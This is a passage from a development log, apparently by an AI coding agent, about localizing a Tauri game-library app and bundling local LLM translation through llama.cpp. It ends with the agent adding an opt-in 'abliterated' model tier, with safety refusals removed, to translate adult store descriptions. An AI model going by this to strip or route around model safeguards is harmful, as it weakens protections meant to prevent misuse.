fully offline, standard Vue 3 integration. No further scoping needed here.

**Content translation** needed more research since "no paid API" still leaves a wide field of
offline/local options, evaluated in order of consideration:
- **Argos Translate** - OpenNMT/CTranslate2-based, Apache-licensed, simplest packaging
  (self-contained `.argosmodel` bundles). Quality noticeably below Google Translate/DeepL,
  especially outside major language pairs, and translates line-by-line with no cross-sentence
  context - fine for "gist of a description," not polished prose.
- **NLLB-200 (Meta) / MADLAD-400 (Google) via CTranslate2** - both free, Apache-2.0, meaningfully
  better quality than Argos, distilled checkpoints small enough to bundle. Would need a native
  sidecar process (CTranslate2 core is C++; Rust bindings exist), fitting the existing WASM/
  sidecar-plugin pattern already used elsewhere in the app.
- **Bergamot** (Firefox's offline translator) - very small per-language-pair models (~20-40MB),
  WASM-native (built for exactly this: client-side, no server), tightest infra fit given
  Concourse's WASM-plugin architecture already exists. Quality below NLLB, but far lighter.
- **Local LLM (e.g. Gemma) via `llama.cpp`** - user reported genuinely good translation quality
  from a local Gemma in prior personal use, prompting a broader look at LLM-based translation vs.
  dedicated MT models. `llama.cpp` compiles to a native binary with Rust bindings (`llama-cpp-2`),
  fits the same "Rust backend owns the integration" pattern as `sgdb.rs`/`igdb.rs`. Tradeoff
  vs. dedicated MT: bigger download and higher RAM during inference, but noticeably better
  fluency and one model handles every language pair (no per-pair model management).
- Clarified two Gemma-family models are *not* interchangeable for this: **EmbeddingGemma**
  produces vector embeddings (similarity/retrieval/RAG) and cannot generate translated text at
  all - it would only be relevant to a future semantic game-search feature, unrelated to i18n.
  **TranslateGemma** (Google, released 2026-01-15, per the technical report at
  arxiv.org/pdf/2601.09012) is the actual right pick over generic Gemma-3-instruct: a dedicated
  translation fine-tune of Gemma 3 (4B/12B/27B, 55 languages, two-stage SFT + RL-optimized
  training), ~26% better translation accuracy than the untuned base model at the same size - the
  12B checkpoint reportedly even beats their own 27B baseline. Same `llama.cpp`/GGUF integration
  path as any other local LLM option, just a better-suited checkpoint for the specific job.

**Scoping decision**: rather than pre-committing to one model, let the user choose at the UI
level. Plan: new `translation` plugin kind (parallel to the existing `source`/`theme`/`metadata`/
`controller` kinds) wraps a `llama.cpp` sidecar; Settings UI presents a picker listing the
available Gemma/TranslateGemma size tiers (tradeoffs: download size, RAM during inference,
translation quality) and triggers a download-on-first-use fetch of the chosen GGUF checkpoint
only after the user picks it - nothing bundled into the installer, nothing fetched speculatively.

Logged as a scoped Post-1.0 milestone at the user's explicit request ("log as milestone only")
rather than starting implementation this session - this is a multi-part feature (new plugin
kind, a model-download manager, a native llama.cpp integration, plus the separate vue-i18n UI
work) better suited to its own dedicated implementation pass.

**Follow-up session: UI i18n implemented (translation-model half still not started).** User
chose to start Milestone 20 with the smaller, self-contained half - vue-i18n for UI strings -
and to fully convert every component in one pass rather than a partial slice, closing that
checklist item outright. Went through `EnterPlanMode` first since the scope (touch nearly every
`.vue` file) and one open architecture question (how the eventual translation feature should be
built) both warranted user sign-off before writing code; `AskUserQuestion` resolved two things
up front - start with UI i18n vs. the translation feature first, and (for later) confirmed the
translation feature should be a built-in host-native Rust module (like `sgdb.rs`/`igdb.rs`
originally were) rather than a new WASM-sandboxed plugin kind, since llama.cpp is a large native
inference dependency that doesn't fit the wasmtime Component Model sandbox cleanly.

Added `vue-i18n@9` (Vue 3/Composition API line). `src/i18n/index.ts` exports a `createI18n`
instance (`legacy: false`, `fallbackLocale: "en"`) and a `messages` map, wired into `main.ts` via
`.use(i18n)` alongside the existing `.use(createPinia())`. `src/i18n/locales/en.json` holds every
string, namespaced by feature area (`common`, `gameDetail`, `nav`, `stats`, `pluginSettings`,
etc.) rather than one flat list, so keys stay traceable back to their component. `i18n.global.t`
(not the `useI18n()` composable, which only works inside a component's own `setup()`) is the
form used anywhere outside a component - store actions building toast messages, for instance.

**Persisted locale setting** follows `stores/appSettings.ts`'s existing
`autoLaunchBigPicture`/`AUTO_LAUNCH_BIG_PICTURE_SETTING` pattern exactly: a new `locale` ref +
`LOCALE_SETTING = "locale"` key through the same `settingsRepo.get`/`set`, defaulting to `"en"`.
`setLocale()` also assigns `i18n.global.locale.value` directly so a language switch takes effect
immediately, no reload needed. `AppSettings.vue` gained a `<select>` language picker built from
`Object.keys(messages)` in `src/i18n/index.ts` (currently just `"en"`/"English") so adding a
second locale file later is a one-file change, not a `AppSettings.vue` edit.

**Full conversion, ~26 components.** Given the mechanical, pattern-following nature of the work
once the infra and one reference conversion (`AppSettings.vue`, done first by hand) existed,
split the remaining components across 4 parallel background agents (~6 files each) rather than
converting serially - each agent converted its own files' `<script setup>`/template strings to
`t(...)`/`{{ t(...) }}` calls but was told *not* to touch `en.json` directly (concurrent edits to
one shared JSON file across 4 agents would conflict); instead each reported its new key→English-
string mappings in its final response, merged into `en.json` by hand afterward in one pass. This
avoided the merge-conflict problem entirely while still parallelizing the actual file-editing
work. `GameDetail.vue` (the most heavily-modified file from the prior UI-polish session) and
`CandidatePicker.vue` were converted by hand directly instead of delegating, given their existing
complexity/context already in hand.

Two real gaps caught in a post-conversion sanity pass (`grep`-ing for capitalized words outside
`t(...)`/`$t(...)` calls, per the plan's own verification step): `GameDetail.vue`'s edit-form
Title and Executable path inputs still had literal `placeholder="Title"`/`placeholder="Executable
path"` - the earlier UI-polish session had dropped their `<label>` wrappers in favor of
placeholder-only fields, and the initial conversion pass covered every remaining `<label>` text
but missed these two now-bare placeholders since they read like ordinary attribute values, not
label text. Fixed by routing them through new `gameDetail.titleLabel`/`executablePathLabel` keys.

Deliberately left untranslated (matches the plan's explicit exclusions): game/tag/collection
names and other data values, file paths, the `release_date` field's `YYYY-MM-DD` placeholder
(a date-format pattern, not language content, same precedent as `addPlugin`'s literal
`https://.../plugin.json` example placeholder), `console.error`/`console.log` text, and code
comments. `bun run build` (`vue-tsc --noEmit` + `vite build`) stayed clean through both the
initial full-conversion pass and the two-key gap fix. No `bunx tauri dev` GUI verification
available in this environment, same limitation as every UI change in prior sessions - only
English renders today regardless (one locale, `en`), so a visual check wouldn't have caught a
translation-content bug anyway, only a broken `t()` call, which `vue-tsc`/build already guard
against structurally (an unset key just falls back to rendering the key path itself, visibly
wrong rather than silently wrong).

Translation-model half (new `translation`/host-native Rust module, llama.cpp, model
picker/download-on-first-use) remains unstarted - a separate, later implementation pass.

**Follow-up: 9 additional UI locales added.** User asked for Korean, Japanese, Simplified
Chinese plus "others you think major," landing on 10 languages total (English plus Korean,
Japanese, Simplified Chinese, Spanish, French, German, Brazilian Portuguese, Russian, Italian) -
a reasonable spread of major world languages by speaker count and desktop-software localization
convention, not an exhaustive list. Each locale (`src/i18n/locales/{ko,ja,zh-Hans,es,fr,de,
pt-BR,ru,it}.json`) mirrors `en.json`'s exact key structure - verified programmatically (a
one-off Node script flattened every locale's keys and diffed against `en.json`'s; all 9 came
back with zero missing/extra keys) rather than trusting manual transcription. Translated
directly (not delegated to a subagent - translation quality isn't improved by delegation, since
any agent uses the same underlying model) preserving every interpolation placeholder exactly
(`{minutes}`, `{count}`, `{name}`, `{version}`, `{hive}`, `{prefix}`, `{host}`, `{hours}`,
`{error}`, `{verb}`) and leaving punctuation-sensitive fragments (e.g. `addPlugin.curatedIntro`,
which is followed by a literal link in the template) grammatically compatible with their
surrounding markup.

`src/i18n/index.ts`'s `messages` map now imports and registers all 10 locale JSON files (`en`,
`ko`, `ja`, `"zh-Hans"`, `es`, `fr`, `de`, `"pt-BR"`, `ru`, `it`); `AppSettings.vue`'s language
`<select>` needed no structural change (it already derives its option list from
`Object.keys(messages)`), only its `localeNames` display-name map extended with each language's
own native-script name (e.g. "한국어", "日本語", "简体中文") rather than English glosses, so the
picker reads correctly to someone who doesn't yet read English. `stores/appSettings.ts`'s
`setLocale`/`init` had a leftover `as "en"` type cast from when only one locale existed - tightened
to a proper `LocaleCode = keyof typeof messages` union instead of leaving it silently permissive.

Flagged directly to the user (not silently glossed over): these are machine translations
(produced by Claude itself, not a licensed MT engine, not native-speaker-reviewed) - fine for
getting real translated UI in front of users quickly, but worth an eventual native-speaker pass
before treating them as final, particularly for longer sentences (`codeWarning`,
`scanOrderHint`, `fetchOrderHint`) where nuance is easiest to lose. `bun run build` clean after
both the initial 9-locale add and the follow-up type-cast cleanup.

**Much later: resumed the translation half, redid the research spike, and switched candidate
engine.** Picked back up where Milestone 20 left off - the local-LLM translation feature, still
unstarted. First step per its own scoping was the research spike: confirm a Rust llama.cpp
binding actually works on the Windows target before committing to it.

Researched `llama-cpp-2`/`llama-cpp-sys-2` (`utilityai/llama-cpp-rs`) specifically rather than
assuming the earlier scoping's pick was still sound - found two real, currently-open Windows-
specific issues: `llama-cpp-sys-2` v0.1.140 fails to build on Windows at all (`cmake` exits with
code 1, downgrading to v0.1.139 works around it), and v0.1.138 on MSVC has a correctness bug
where GGUF models over 4GB fail to load ("failed to read magic," a 32-bit integer truncation in
the build). Both are real bugs on the exact platform this app ships for (Windows-primary per
`CLAUDE.md`), not hypothetical - reported directly rather than treating the crate as a rubber
stamp just because it was the original pick.

Asked what else exists in this space; researched and identified `mistralrs` (built on Hugging
Face's Candle) as the strongest alternative specifically because it sidesteps the exact failure
mode found above - pure Rust, no CMake/native-C++ build step anywhere in the chain, confirmed
Gemma 3 support (the TranslateGemma family is Gemma-3-based), and ships a `mistralrs` crate
meant for direct embedding in a Rust application (not just its server/CLI mode).

Redid the research spike hands-on against `mistralrs` rather than trusting docs claims alone:
built a throwaway scratch Cargo project (`$CLAUDE_JOB_DIR/tmp/mistralrs-spike`, not part of the
real repo), `cargo add mistralrs` (resolved to v0.8.1, default features - no `cuda`/`metal`/
`mkl`), `cargo build`. Compiled clean in ~4m27s on this actual Windows machine - `candle-core`
(the pure-Rust tensor backend) and every `mistralrs-*` crate (`core`/`macros`/`vision`/`audio`/
`mcp`) built as plain Rust, no CMake invocation, no MSVC/native-linker errors anywhere in the
627-package dependency tree. This is a real, verified result, not a "should work in theory" -
the whole point of a research spike is not skipping this step just because the first candidate
looked reasonable on paper.

Updated Milestone 20's scoping to reflect the outcome: the planned `translation` module's engine
switches from llama.cpp to `mistralrs`; the research-spike checklist item is now closed (marked
done, but redone against the actual engine that'll be used, not the one originally guessed at).
The `translation` module itself, the model picker/download-on-first-use Settings UI, and actual
integration work all remain unstarted - this pass was scoping/de-risking only, same "research
spike first" discipline the milestone was already scoped to require.

**Immediate follow-up: user said "start now" - built the actual feature, Milestone 20 fully
closed.** Before writing any code, researched real GGUF artifacts rather than inventing plausible
ones: fetched `mradermacher`'s (a well-established community GGUF quantizer) `translategemma-4b/
12b/27b-it-GGUF` Hugging Face repos directly and recorded real Q4_K_M file sizes (2.6GB/7.4GB/
16.6GB) and the exact `resolve/main/...` download URL pattern - `mradermacher`'s own site also
calls the 12B tier "fast, recommended," consistent with the earlier research note that 12B
reportedly beats the 27B baseline. Also fetched `mistral.rs`'s real `getting_started/
gguf_locally` example from its GitHub repo to confirm the actual builder API
(`GgufModelBuilder::new(dir, vec![file]).with_logging().build().await?`, then
`model.send_chat_request(...)`) and cross-checked the crate's own source (`gguf.rs`, `lib.rs`,
`model.rs` via `gh api`) to confirm `Model`/`GgufModelBuilder` are both re-exported at the crate
root and `build()` returns `anyhow::Result<Model>` - verified against real source rather than
assumed from the earlier spike's more general research.

Went through `EnterPlanMode` given the scope (new Rust module + dependency, new store, new
Settings UI, `GameDetail.vue` integration). Accidentally called `EnterWorktree` first (no
worktree was requested by the user or `CLAUDE.md`) - caught the mistake immediately and called
`ExitWorktree` with `action: "remove"` before doing anything else, back in the main working
directory with nothing touched.

**`src-tauri/src/translation.rs`** (new module, registered in `lib.rs` alongside a `.manage
(translation::TranslationState::new())` call):
- `Cargo.toml` gained `mistralrs = "0.8"` (default/CPU-only features, matching the verified
  spike) and `tokio` as a direct dependency (`fs`/`io-util`/`sync` features) - tokio was already
  resolved transitively at 1.52.3 via `tauri`/`mistralrs`, so adding it directly for
  `tokio::fs`/`AsyncWriteExt`/`sync::Mutex` introduced no version conflict.
- `list_models()` - a plain `Vec<TranslationModel>` (id/name/repo/file/size_bytes) for the 3
  tiers, built at call time rather than a true `const` array (avoids `&'static str` vs `String`
  friction for what's returned to the frontend as JSON anyway).
- `download_translation_model` - streams the GGUF via `reqwest::get(...).chunk().await` in a
  loop (not a one-shot `.bytes()` read, unlike every other download in this codebase -
  `plugin_installer.rs`'s `download_bytes` - since a multi-gigabyte file genuinely needs
  incremental progress, and this codebase had no existing streaming-download-with-progress
  pattern to reuse, contrary to what the plan assumed before implementation started).
  Downloads to a `.part` temp file, renamed into place only on success, so a half-finished
  download can never look "downloaded" to `is_translation_model_downloaded`'s plain file-exists
  check on next launch. Emits `translation-download-progress`
  (`model_id`/`downloaded_bytes`/`total_bytes`) per chunk via `app.emit(...)` - same
  `Emitter`/payload-struct pattern `launcher.rs`'s `game-session-ended` event already
  established, reused rather than inventing a new one.
- `TranslationState` (`Mutex<Option<{model_id, model: Arc<Model>}>>`, Tauri-managed) - a loaded
  GGUF model stays cached across `translate_text` calls, only reloading when the requested
  model id actually differs from what's currently loaded (loading a multi-gigabyte model is far
  too slow to redo per call).
- `translate_text` builds a plain instruction prompt ("Translate the following text into
  {target_language}. Only output the translation, nothing else.") and calls
  `send_chat_request` - no system-prompt/chat-template customization attempted beyond what the
  GGUF's own embedded template provides, since that's untestable without a real download in
  this environment (flagged in the plan's own verification section as the one thing only the
  user can confirm end-to-end).

**Frontend**: `stores/translation.ts` mirrors `appSettings.ts`'s persistence pattern
(`selectedModelId` through `settingsRepo`'s `translation_model` key) and `library.ts`'s
`listen()`/`UnlistenFn`/`dispose()` pattern for the progress event, added to the `stores/`
barrel. `AppSettings.vue` gained a model-picker section (radio per tier, size shown via a
`formatBytes` helper, a Download button that becomes a live `{percent}%` button mid-download,
reusing the shared `.compact-button` class rather than a new one). `GameDetail.vue` gained a
"Translate"/"Show original" toggle button (reusing `.compact-button` again) next to the
description in view mode only, gated on `canTranslate` (a model is both selected and actually
downloaded) - translates into `appSettings.locale`, swaps only the *displayed* Markdown-rendered
description (`descriptionHtml`'s computed now reads `translatedDescription.value ?? game.value.
description`), never touches the stored `game.description` field or hits the DB. Resets
`translatedDescription` back to `null` whenever the viewed game changes (piggybacking on the
existing `watch(game, ...)`), so navigating to a different game never shows a stale translation.
Errors surface via the existing `useToastStore`, matching every other async action on this page.

All 8 new i18n keys (`settings.translation`/`translationHint`/`downloaded`/`downloading`/
`download`, `gameDetail.translate`/`translating`/`showOriginal`) added to all 10 locales in one
pass (a small Node script, not hand-editing 10 files) and re-verified for exact key parity with
`en.json` via the same flatten-and-diff check used for every previous locale addition this
session.

`cargo check` (real `src-tauri` crate, not just the scratch spike) and `bun run build` both
clean. Milestone 20 is now fully closed - both UI localization and offline translation done.
Deliberately deferred, per the plan: persisting a translated description back to the DB,
translating other fields (release date, tags), canceling an in-progress download, and any model
beyond the 3 TranslateGemma tiers. Manual, real end-to-end verification (an actual download, an
actual translation) is still only possible on the user's own machine - this environment has no
way to run the full Tauri GUI or spend the time/bandwidth downloading a multi-gigabyte model.

**Real user testing broke the above: `mistralrs` cannot load Gemma 3 GGUF at all, pivoted to
llama.cpp's own prebuilt binary run as a subprocess.** The "manual end-to-end verification" gap
flagged above turned out to be load-bearing - the user actually ran the built app, downloaded a
model, and hit a real runtime panic: `thread 'tokio-rt-worker' panicked at ...mistralrs-core-
0.8.1\src\gguf\content.rs:151:22: called \`Result::unwrap()\` on an \`Err\` value: Unknown GGUF
architecture "gemma3"`. Root-caused via web research rather than guessing at a version-pinning
fix: `mistralrs`'s own `GGUFArchitecture` enum has no `gemma3` variant at all - a genuine,
current gap in the crate (confirmed via multiple open GitHub issues on `EricLBuehler/mistral.rs`
showing the same failure mode for other model families, e.g. Qwen3.5). This directly falsified
the earlier "redo the research spike" verification, which had only confirmed `mistralrs`
*compiles* on Windows, not that it could load the *actual target model format* - a real gap in
verification thoroughness, called out to the user as such rather than glossed over.

User asked for a broad alternatives comparison ("is there any alternatives besides llama-cpp-2/
mistralrs", "let's compare all possible solutions"). Researched and rejected in turn:
- **`candle-transformers`'s `quantized_gemma3.rs`** - confirmed to exist in Candle's own source
  (one layer below `mistralrs`, meaning Candle itself supports gemma3 GGUF even though
  `mistralrs`'s convenience wrapper doesn't dispatch to it) - rejected as too much hand-rolled
  implementation risk (no builder API; would mean writing tokenization/sampling/the generation
  loop ourselves).
- **`mistralrs`'s non-GGUF `ModelBuilder`/`TextModelBuilder` path** (HF-hub, safetensors+ISQ) -
  confirmed Gemma 3 support exists here, but `google/translategemma-4b-it` on Hugging Face is a
  gated repo (manual "Request access" click-through, license acceptance, an access token) - a
  real UX/portability regression against the anonymous-download design goal. No confirmed
  progress-callback API either. Rejected.
- **Ollama** - TranslateGemma is officially published in Ollama's own library (`ollama pull
  translategemma:4b`/`:12b`), zero gating, proven to work - but it's a full separate installed
  application (installer, background service, tray icon), not something Concourse can invisibly
  bundle/manage the way a bare subprocess binary can. Rejected as the primary mechanism.
- **LM Studio** - OpenAI-compatible API at `localhost:1234/v1`, llama.cpp-backed under the hood
  (same gemma3 maturity), no auth (loopback-only) - but its server must be manually started by
  the user each session, and we can only detect "currently running," not "installed but idle," a
  weaker signal than Ollama's. Rejected as primary mechanism for the same reasons as Ollama.
- **Detecting user-installed runtimes generally** - user then explicitly narrowed the comparison
  to exactly this question ("llama.cpp prebuilt binary as plugin vs check availability of user-
  installed binaries such as ollama, lmstudio"). Rejected as the primary/sole mechanism: only
  helps the minority of users who already have one installed *and* have already pulled the exact
  model; adds real UI/testing/support surface (multiple different code paths); still needs a
  bundled fallback regardless, making detection purely additive complexity on top of the bundle
  approach rather than a replacement for it. Deferred as a possible future opportunistic
  enhancement, not built.
- Reverting to `llama-cpp-2`/`llama-cpp-sys-2` was also re-considered and re-rejected - same
  known Windows CMake fragility documented earlier in this milestone.

User said "okay, go with A" - bundle llama.cpp's own prebuilt server binary, run it as a
subprocess, talk to it over its OpenAI-compatible HTTP API. Verified every claim about the
chosen release hands-on rather than trusting docs: `gh api repos/ggml-org/llama.cpp/releases/
latest --jq '.tag_name, .assets[].name'` to find the real pinned version (`b10290`) and exact
asset name (`llama-b10290-bin-win-cpu-x64.zip`); downloaded the actual zip and ran `unzip -l` on
it to confirm it's flat (no wrapping subfolder) and contains `llama-server.exe` (a thin 9KB
launcher), `llama-server-impl.dll` (~9.9MB, the real implementation), all needed `ggml-cpu-*.dll`
CPU-dispatch libraries, and - concrete proof of Gemma 3 support in this exact build - a dedicated
`llama-gemma3-cli.exe`; extracted it and ran `./llama-server.exe --version` to confirm it
actually executes on this machine (`version: 10290 (c8e03ce81)`, built with Clang 20.1.8).

Rewrote `src-tauri/src/translation.rs` from scratch around this design. Removed the `mistralrs`
Cargo dependency entirely - this is no longer a Rust ML crate dependency at all, nothing is
compiled or linked into Concourse's own binary. `tokio` gained `process`/`time` features
(subprocess management, async sleep/polling) alongside its existing `fs`/`io-util`/`sync`.
`download_translation_engine` reuses `zip_install.rs`'s existing `extract_zip`/`replace_dir`
helpers (already used by `plugin_installer.rs`'s `install_plugin`) rather than writing new
zip-handling code - downloads to a `.staging` dir, atomically swapped into place on success, same
pattern as a wrapper plugin's own runtime install. `TranslationState` (`Mutex<Option<
RunningServer>>`, `RunningServer { model_id, child: Child }`) keeps the `llama-server.exe`
subprocess alive across `translate_text` calls, only restarting (`child.kill().await`) when the
requested model id differs from what's currently running - mirrors the old loaded-model-cache
design but at the process level instead of the in-memory-model level. Readiness polled via
`GET http://127.0.0.1:8712/health` (`SERVER_PORT` fixed at `8712` - a known simplification, could
collide with another local llama.cpp instance, not handled this pass), up to 120 retries at 500ms
each (60s timeout). `translate_text` posts to the server's `/v1/chat/completions` with the same
translation-instruction prompt as before, unchanged from the mistralrs era since the store's
public `translate()` signature didn't need to change. Two new commands
(`is_translation_engine_downloaded`, `download_translation_engine`) added to `lib.rs`'s
`generate_handler!` alongside the 4 existing ones. `cargo check` clean (~2m10s, full
dependency-graph recompile after removing `mistralrs`).

Frontend: `stores/translation.ts` gained `engineDownloaded`/`downloadingEngine` refs and a
`downloadEngine()` action, plus an `is_translation_engine_downloaded` check in `init()`.
`AppSettings.vue` gained a "Translation engine" download row (reusing the existing `.model-row`/
`.compact-button` classes) above the per-tier model list, since the engine is now a genuinely
separate one-time download from any model. `GameDetail.vue`'s `canTranslate` computed updated to
also require `translation.engineDownloaded`, not just a selected-and-downloaded model - the
engine is a real prerequisite now, not implicit. Two new i18n keys (`settings.translationEngine`,
`settings.downloadingEngine`) plus an updated `settings.translationHint` wording (mentions the
two-step download) added to `en.json` and propagated to all 9 other locales via the same
flatten-and-diff Node script used throughout this project - re-verified exact key parity across
all 10 locales. `bun run build` (full frontend, all three touched files together) and a final
`cargo fmt && cargo check` pass both clean.

**Follow-up, same session: wired the app-exit kill.** The orphaned-`llama-server.exe` risk
flagged above was fixed directly rather than left open. `TranslationState::shutdown()` added -
a plain synchronous method (`self.0.blocking_lock()`, not `.await`) that calls `Child::
start_kill()` (a sync, fire-and-forget kill signal - no runtime needed, unlike `child.kill()`
which is async) if a server is currently running. `lib.rs` switched from `.run(context)` to
`.build(context)?.run(|app_handle, event| ...)` so a `RunEvent::Exit` handler could be added,
calling `app_handle.state::<TranslationState>().shutdown()` - needed adding `use tauri::Manager`
at the top of `lib.rs` for `.state::<T>()` to resolve. `blocking_lock` is safe here since exit
teardown runs on the main thread outside any async task, never contending with a held guard
elsewhere. `cargo fmt && cargo check` clean.

Real end-to-end verification (an actual download, an actual translation, confirming this pivot
actually fixes the crash, and confirming the exit hook actually kills the process) still can only
happen on the user's own machine.

**Follow-up: added cheaper Gemma 3/4 tiers, then removed the 12B/27B TranslateGemma tiers
entirely once their RAM cost was actually sized against a real gaming machine.** User first
asked to explore Gemma 3 and Gemma 4 (not just TranslateGemma) for cheaper options. Researched
real GGUF file sizes via web search rather than estimating from parameter counts: Gemma 4
(released April 2026, built on the same research as Gemini 3, natively multilingual across 140+
languages) ships `E2B`/`E4B` elastic-sized tiers whose *file* sizes don't track their
"effective" active-param naming - `gemma-4-E2B-it-Q4_K_M.gguf` (unsloth) is actually 3.11GB,
*larger* than `translategemma-4b-it.Q4_K_M.gguf` (2.49GB, corrected from the earlier 2.6GB
estimate) despite the smaller name, so E2B was skipped as strictly worse (bigger, less
specialized). `gemma-4-E4B-it-Q4_K_M.gguf` (unsloth) at 4.98GB was added as the "balanced"
general-purpose tier. `gemma-3-1b-it-Q4_K_M.gguf` (unsloth) at ~845MB was added as the cheapest
tier - genuinely small, at a real quality cost since it's a general instruct model, not
translation-tuned. `gemma-3-270m-it` (~253MB) was considered and rejected as too small to trust
for real translation quality even as a bottom tier.

User then asked for an actual sizing analysis against real 16GB/32GB gaming hardware, using
average parts for each, rather than reasoning about RAM abstractly - and to decide whether the
12B (7.3GB, corrected from 7.4GB)/27B (16.6GB) TranslateGemma tiers still belonged in the list
given that. Researched current (2026) Steam Hardware Survey data and typical build guides:

- **16GB tier** (Steam's single most common RAM configuration, 41.57% of surveyed systems) -
  representative build: Ryzen 5 5600, RTX 4060 / RX 7600, 1080p. Typical games: esports/live-
  service titles (Valorant, CS2, Fortnite, Apex Legends, League of Legends) plus AAA at 1080p
  medium-high (GTA V, recent Call of Duty entries, Cyberpunk 2077 on non-ultra settings). Real
  system-RAM budget on this class of machine: OS + background (Windows 11, Discord, browser)
  commonly 3-5GB, a modern AAA title's own working set commonly 8-12GB - already a thin margin
  on 16GB total before adding anything else running alongside it.
- **32GB tier** (the survey-cited realistic baseline for a versatile mid-to-high-end build) -
  representative build: Ryzen 7 7800X3D/9800X3D, RTX 4070 Super/5070/4080 Super, 1440p ultra.
  Typical games: demanding modern AAA at max settings (Cyberpunk 2077 ultra, Alan Wake 2,
  Baldur's Gate 3, Starfield) - same OS/background overhead, but 32GB total leaves comfortable
  headroom (often 12GB+ spare) even under a heavy game's working set.

Conclusion reached and acted on directly: on a 16GB machine, `translategemma-4b`/`gemma4-e4b`
(2.49GB/4.98GB resident, since this engine loads the full GGUF into RAM rather than just memory-
mapping cold pages) sitting alongside an already RAM-tight AAA session is a real risk of paging/
stutter - the smaller `translategemma-4b` is the safer of the two there, and both are best used
before/after a session rather than left resident during one. On a 32GB machine, either tier is a
negligible fraction of available headroom - fine to leave running during gameplay. The 12B/27B
tiers, by contrast, don't fit *either* profile - 7.3GB alone exceeds a 16GB machine's entire
comfortable AAA headroom, and even 32GB users would be giving up double-digit GB of RAM to a
background translation process for marginal quality gain over 4B (which the milestone's own
earlier benchmark research already noted 12B "reportedly beats the 27B baseline" on, i.e. the
27B tier's quality edge over 4B was never that large in the first place). Removed both tiers
from `list_models()` entirely rather than leaving them in as a "not recommended" option - the
per-model download infrastructure doesn't change, so nothing else in `translation.rs` needed
touching. `cargo fmt && cargo check` and `bun run build` both clean.

Not yet built, flagged as a real follow-up given this analysis: an idle-timeout auto-shutdown
for the running `llama-server.exe` (so RAM isn't held resident indefinitely after a single
translation, not just cleaned up on model-switch/app-exit as today) - would meaningfully help
the 16GB case specifically. Deferred, not blocking this pass.

**Immediate follow-up, same session: built the idle-timeout auto-shutdown.** `RunningServer`
gained `last_used: Instant` (bumped in `ensure_server`'s "same model, reuse" branch on every
`translate_text` call) and `generation: u64` (a monotonic id from a new `TranslationState.
next_generation: AtomicU64`, incremented each time a server actually (re)starts). A new
`watch_idle(app, generation)` async task is spawned (`tauri::async_runtime::spawn`, not raw
`tokio::spawn` - keeps it independent of whichever runtime Tauri happens to be driving) once per
server start, polling every 30s (`IDLE_CHECK_INTERVAL`) and killing the server once `last_used`
is more than 5 minutes stale (`IDLE_TIMEOUT`).

The `generation` tag exists specifically to avoid a real race: without it, a watchdog spawned
for an old server could fire *after* a model switch already replaced it in the `Mutex` slot with
a different, freshly-started server, and kill the wrong one. `watch_idle` re-reads the state on
every tick and only acts if `running.generation` still matches the value it was spawned with -
otherwise (slot empty, or now holds a newer generation) it just returns quietly, since some
other path (model switch, `shutdown()` on app exit, or its own timeout firing) has already made
this watchdog's job moot. This is the same generation-counter pattern used to distinguish stale
async work from current state, just applied to a background task instead of a request.

`TranslationState`'s single `Mutex<Option<RunningServer>>` field also got named (`running`)
instead of staying a bare tuple-struct field (`state.0`) - `next_generation` living alongside it
made the tuple-struct shape confusing (`state.0` vs `state.1` reads as arbitrary), a plain named
struct reads clearly at every call site. `cargo fmt && cargo check` clean.

**Immediate follow-up, same session: swapped the model lineup again after user pushback caught
a real gap in the previous research.** User first suggested ~3GB was the real sweet spot given
the earlier 16GB/32GB sizing analysis, prompting a search for non-Gemma alternatives that fit
under that ceiling. Found and initially proposed `EuroLLM-1.7B-Instruct` (~1.05GB,
translation-tuned via the EuroBlocks dataset, whose language list at face value named all 10 of
this app's locales) as a cheap replacement for `gemma3-1b`, and `Qwen3-4B` (~2.5GB, 119-language
general model) as a lighter, newer replacement for `gemma4-e4b`.

User then reported Gemini had flagged EuroLLM as Europe-specialized and weak on Korean
specifically - checked this directly against EuroLLM's own model card rather than taking either
claim at face value, and it held up: EuroLLM's 35 languages are explicitly split into 24
"official EU" languages (its actual training priority) and 11 "additional, strategically
important" languages tacked on secondarily - and Korean, Japanese, Chinese, and Russian (4 of
this app's 10 shipped locales, 40% of them) all fall in that weaker secondary tier, not the core
one. The earlier "10/10 coverage" check had only verified language *presence* on the list, not
which training tier a language actually belonged to - a real miss, corrected here rather than
glossed over, same category of gap as the earlier mistralrs "compiles ≠ actually works" miss
this milestone already learned from once.

Rejected EuroLLM on this basis and asked for another candidate; user proposed Qwen2.5 (1.5B or
3B). Compared both: `Qwen2.5-1.5B-Instruct` (1.12GB) vs `Qwen2.5-3B-Instruct` (2.1GB) - picked
1.5B, since 3B would have sat redundantly close in size to both `translategemma-4b` (2.49GB) and
`qwen3-4b` (2.5GB) without filling any actual gap, while 1.5B fills the cheap-tier slot EuroLLM
vacated. Qwen2.5's own announced language list directly names all 10 of this app's locales
(English/Chinese/Japanese/Korean/Spanish/French/German/Italian/Portuguese/Russian) in a single
flat 29+-language list with no EU-style tiering disclosed anywhere - the one specific caveat
being that Qwen's own materials call out Chinese/English as the strongest-performing pair, which
is an expected primary-training-focus skew common to every general multilingual model, not the
same kind of secondary-tier gap EuroLLM had.

Final lineup in `list_models()`: `qwen2.5-1.5b` (~1.12GB, cheapest, general-purpose, repo
`Qwen/Qwen2.5-1.5B-Instruct-GGUF`), `translategemma-4b` (~2.49GB, recommended, translation-
specialized, unchanged), `qwen3-4b` (~2.5GB, broader coverage, general-purpose, repo
`unsloth/Qwen3-4B-GGUF`). All three now sit under ~2.5GB - `gemma3-1b`, `gemma4-e4b`, and
EuroLLM's rejection are all recorded directly in `list_models()`'s own doc comment so a future
pass doesn't re-propose them without re-checking the same problem. `cargo fmt && cargo check`
clean; no frontend changes needed since `AppSettings.vue`/`GameDetail.vue` both read the tier
list dynamically rather than hardcoding ids.

**Immediate follow-up, same session: added a fourth, opt-in "abliterated" tier for NSFW game
libraries.** User asked whether an abliterated (refusal-direction-removed, not retrained) model
made sense here. Judged this a legitimate use case rather than a jailbreak request: this app's
own library can legitimately contain adult games, and a safety-tuned model can flatly refuse to
translate that game's *own existing store description* just for containing adult content - a
false-positive refusal on third-party text the app is only relaying, not generating new content
via. Researched real abliterated GGUF builds of the tiers already in the list:
`Qwen2.5-1.5B-Instruct-abliterated` (`mradermacher`, ~986MB) and `Qwen3-4B-abliterated`
(`bartowski/mlabonne_Qwen3-4B-abliterated-GGUF`, same ~2.5GB size class as base Qwen3-4B - exact
Q4_K_M byte count wasn't published for this specific repo, so the base model's own verified size
was reused as a reasonable estimate, same as this file already does elsewhere for `download_
translation_model`'s fallback path). No abliterated build of `translategemma-4b` itself exists
